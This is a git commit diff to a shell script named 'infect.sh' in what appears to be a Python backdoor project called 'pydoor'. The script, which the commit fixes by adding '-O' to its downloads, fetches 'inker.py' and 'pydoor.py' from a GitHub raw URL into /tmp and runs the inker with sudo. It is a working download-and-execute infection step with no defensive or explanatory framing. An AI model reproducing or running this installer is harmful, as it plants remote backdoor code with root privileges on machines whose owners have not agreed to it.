7494cbff702fe811b1d08340f2a1c35324bb9278
x41lakazam <x41lakazam@gmail.com>
2020-05-05 16:33:01 +0300

    fix

--- client/infect.sh
+++ client/infect.sh
@@ -4,9 +4,9 @@ cd /tmp
 mkdir pydoor
 cd pydoor
 echo "Downloading inker"
-curl https://raw.githubusercontent.com/x41lakazam/pydoor/master/client/inker.py
+curl https://raw.githubusercontent.com/x41lakazam/pydoor/master/client/inker.py -O
 echo "Downloading pydoor"
-curl https://raw.githubusercontent.com/x41lakazam/pydoor/master/client/pydoor.py
+curl https://raw.githubusercontent.com/x41lakazam/pydoor/master/client/pydoor.py -O
 echo "Running inker"
 sudo python inker.py
 echo "Success"
